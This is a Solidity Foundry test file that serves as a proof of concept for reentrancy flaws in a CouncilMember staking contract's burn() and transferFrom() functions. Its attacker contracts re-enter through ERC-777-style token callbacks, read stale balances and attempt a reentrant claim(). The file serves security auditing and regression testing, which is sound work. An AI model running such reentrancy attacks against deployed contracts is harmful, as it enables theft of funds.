// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {CouncilMember} from "../../contracts/sablier/core/CouncilMember.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISablierV2Lockup} from "../../contracts/sablier/interfaces/ISablierV2Lockup.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

/* ──────────────────────────────────────────────────────────────
   Helper: ERC-20 with an ERC-777-style tokensReceived hook
   ────────────────────────────────────────────────────────────── */
interface ITokenReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

contract CallbackERC20 is IERC20 {
    string public name = "CallbackTelcoin";
    string public symbol = "cTEL";
    uint8 public decimals = 2;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    mapping(address => bool) public hookEnabled;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function enableHook(address addr) external {
        hookEnabled[addr] = true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        // ERC-777-style callback AFTER balance update
        if (hookEnabled[to] && to.code.length > 0) {
            ITokenReceiver(to).onTokenReceived(msg.sender, amount);
        }
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        if (allowance[from][msg.sender] < type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        if (hookEnabled[to] && to.code.length > 0) {
            ITokenReceiver(to).onTokenReceived(from, amount);
        }
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

/* ──────────────────────────────────────────────────────────────
   Helper: Lockup that always has tokens available
   (removes the same-block limitation of TestSablierV2Lockup
   so _retrieve() is non-trivial during reentrancy)
   ────────────────────────────────────────────────────────────── */
contract AlwaysAvailableLockup is ISablierV2Lockup {
    IERC20 public token;
    uint256 public constant DRIP = 100;

    constructor(IERC20 token_) {
        token = token_;
    }

    function withdrawMax(uint256, address to) external returns (uint128) {
        token.transfer(to, DRIP);
        return uint128(DRIP);
    }

    function withdrawableAmountOf(uint256) external pure returns (uint128) {
        return uint128(DRIP);
    }
}

/* ──────────────────────────────────────────────────────────────
   Attacker: exploits the burn() reentrancy window.
   During the TELCOIN.safeTransfer callback inside burn(),
   attempts to reenter via claim() and records what it observes.
   ────────────────────────────────────────────────────────────── */
contract BurnReentrancyAttacker is ITokenReceiver {
    CouncilMember public target;
    uint256 public ownedTokenId;
    bool private _entered;

    // Observations captured during the callback window
    bool public callbackFired;
    bool public reentrantClaimSucceeded;
    bool public burnedSlotAccessible;
    uint256 public burnedSlotBalance;
    uint256 public totalSupplyDuringCallback;

    constructor(CouncilMember target_, uint256 ownedTokenId_) {
        target = target_;
        ownedTokenId = ownedTokenId_;
    }

    function onTokenReceived(address, uint256) external {
        if (!_entered) {
            _entered = true;
            callbackFired = true;

            // Snapshot state visible during the reentrancy window
            totalSupplyDuringCallback = target.totalSupply();

            // Is the burned slot still in the balances array?
            try target.balances(2) returns (uint256 bal) {
                burnedSlotAccessible = true;
                burnedSlotBalance = bal;
            } catch {
                burnedSlotAccessible = false;
            }

            // Attempt a reentrant claim (triggers _retrieve internally).
            // Uses try/catch so the outer burn() still completes even if
            // a future reentrancy guard reverts this call.
            try target.claim(ownedTokenId, 0) {
                reentrantClaimSucceeded = true;
            } catch {
                reentrantClaimSucceeded = false;
            }
        }
    }
}

/* ──────────────────────────────────────────────────────────────
   Attacker: exploits the transferFrom() reentrancy window.
   During the TELCOIN.safeTransfer callback inside transferFrom(),
   records the balance that should already be zeroed but isn't.
   ────────────────────────────────────────────────────────────── */
contract TransferFromReentrancyAttacker is ITokenReceiver {
    CouncilMember public target;
    uint256 public tokenId;
    bool private _entered;

    bool public callbackFired;
    uint256 public staleBalanceDuringCallback;
    uint256 public balanceIndexRead;
    uint256 public amountReceived;
    uint256 public balances1During;
    uint256 public runningBalanceDuring;
    uint256 public totalSupplyDuring;

    constructor(CouncilMember target_, uint256 tokenId_) {
        target = target_;
        tokenId = tokenId_;
    }

    function onTokenReceived(address, uint256 amount) external {
        if (!_entered) {
            _entered = true;
            callbackFired = true;
            amountReceived = amount;

            // Read various state to understand what's visible during the callback
            totalSupplyDuring = target.totalSupply();
            runningBalanceDuring = target.runningBalance();

            uint256 balIdx = target.tokenIdToBalanceIndex(tokenId);
            balanceIndexRead = balIdx;
            staleBalanceDuringCallback = target.balances(balIdx);

            // Also read balances[1] to see if it's correct
            try target.balances(1) returns (uint256 b1) {
                balances1During = b1;
            } catch {}
        }
    }
}

/* ==============================================================
   TEST CONTRACT
   All three tests assert the EXPECTED safe behaviour.
   They FAIL against the current CouncilMember, proving the
   reentrancy vulnerability exists.
   ============================================================== */
contract CouncilMemberReentrancyTest is Test {
    CouncilMember public council;
    CallbackERC20 public token;
    AlwaysAvailableLockup public lockup;

    address public admin = address(0xA);
    address public member1 = address(0xB);
    address public member3 = address(0xC);

    bytes32 public constant GOV_ROLE = keccak256("GOVERNANCE_COUNCIL_ROLE");

    function setUp() public {
        token = new CallbackERC20();
        lockup = new AlwaysAvailableLockup(IERC20(address(token)));
        token.mint(address(lockup), 1_000_000);

        vm.startPrank(admin);
        CouncilMember impl = new CouncilMember();
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(impl),
            admin,
            abi.encodeCall(
                CouncilMember.initialize,
                (
                    IERC20(address(token)),
                    "Test",
                    "T",
                    ISablierV2Lockup(address(lockup)),
                    0
                )
            )
        );
        council = CouncilMember(address(proxy));
        council.grantRole(GOV_ROLE, admin);
        vm.stopPrank();
    }

    /* ─────────────────────────────────────────────────────────
       burn() reentrancy #1: reentrant claim() should revert
       ───────────────────────────────────────────────────────── */
    /// @notice A secure contract would have a reentrancy guard that
    ///         prevents claim() from being called during burn().
    ///         This test FAILS because no such guard exists.
    function test_burn_reentrant_claim_should_revert() public {
        BurnReentrancyAttacker attacker = new BurnReentrancyAttacker(
            council,
            1
        );

        vm.startPrank(admin);
        council.mint(member1); // token 0
        council.mint(address(attacker)); // token 1 (attacker keeps this)
        council.mint(member3); // token 2 (will be burned)
        vm.stopPrank();

        token.enableHook(address(attacker));

        vm.prank(admin);
        council.burn(2, address(attacker));

        // Sanity: the callback must have fired for this test to be meaningful
        assertTrue(attacker.callbackFired(), "Sanity: callback must fire");

        // EXPECTED: a reentrancy guard blocks the reentrant claim()
        assertFalse(
            attacker.reentrantClaimSucceeded(),
            "VULNERABILITY: reentrant claim() succeeded during burn() - no reentrancy guard"
        );
    }

    /* ─────────────────────────────────────────────────────────
       burn() reentrancy #2: burned slot should be cleaned up
       before any external call (CEI)
       ───────────────────────────────────────────────────────── */
    /// @notice After _burn() the balances array cleanup (pop) should
    ///         happen BEFORE TELCOIN.safeTransfer so that no external
    ///         call can observe stale array entries.
    ///         This test FAILS because cleanup happens AFTER the transfer.
    function test_burn_cleanup_before_external_call() public {
        BurnReentrancyAttacker attacker = new BurnReentrancyAttacker(
            council,
            1
        );

        vm.startPrank(admin);
        council.mint(member1); // token 0
        council.mint(address(attacker)); // token 1
        council.mint(member3); // token 2
        vm.stopPrank();

        token.enableHook(address(attacker));

        vm.prank(admin);
        council.burn(2, address(attacker));

        assertTrue(attacker.callbackFired(), "Sanity: callback must fire");

        // EXPECTED: balances[2] is already popped / inaccessible during the callback
        assertFalse(
            attacker.burnedSlotAccessible(),
            "VULNERABILITY: burned balance slot still in array during external call - CEI violation in burn()"
        );
    }

    /* ─────────────────────────────────────────────────────────
       transferFrom() reentrancy: balance should be zeroed
       before TELCOIN.safeTransfer (CEI)
       ───────────────────────────────────────────────────────── */
    /// @notice transferFrom() should zero balances[balanceIndex] BEFORE
    ///         calling TELCOIN.safeTransfer. This test FAILS because
    ///         the zeroing happens AFTER the transfer.
    function test_transferFrom_zeroes_balance_before_transfer() public {
        TransferFromReentrancyAttacker attacker = new TransferFromReentrancyAttacker(
                council,
                0
            );

        vm.startPrank(admin);
        council.mint(address(attacker)); // token 0 -> attacker
        council.mint(member1); // token 1
        vm.stopPrank();

        // Let attacker accumulate a non-zero balance
        vm.prank(admin);
        council.retrieve();
        uint256 balIdx = council.tokenIdToBalanceIndex(0);
        uint256 accruedBalance = council.balances(balIdx);
        assertGt(
            accruedBalance,
            0,
            "Sanity: attacker must have accrued balance"
        );

        token.enableHook(address(attacker));

        vm.prank(admin);
        council.transferFrom(address(attacker), member3, 0);

        assertTrue(attacker.callbackFired(), "Sanity: callback must fire");

        // Debug: log what the attacker saw during the callback
        console.log("Amount received in callback:", attacker.amountReceived());
        console.log("Balance index read:", attacker.balanceIndexRead());
        console.log(
            "Stale balance during callback:",
            attacker.staleBalanceDuringCallback()
        );
        console.log(
            "Balance after transferFrom:",
            council.balances(council.tokenIdToBalanceIndex(0))
        );

        // EXPECTED: balance is zero during the callback (effects before interactions)
        assertEq(
            attacker.staleBalanceDuringCallback(),
            0,
            "VULNERABILITY: balance was non-zero during TELCOIN transfer callback - CEI violation in transferFrom()"
        );
    }
}
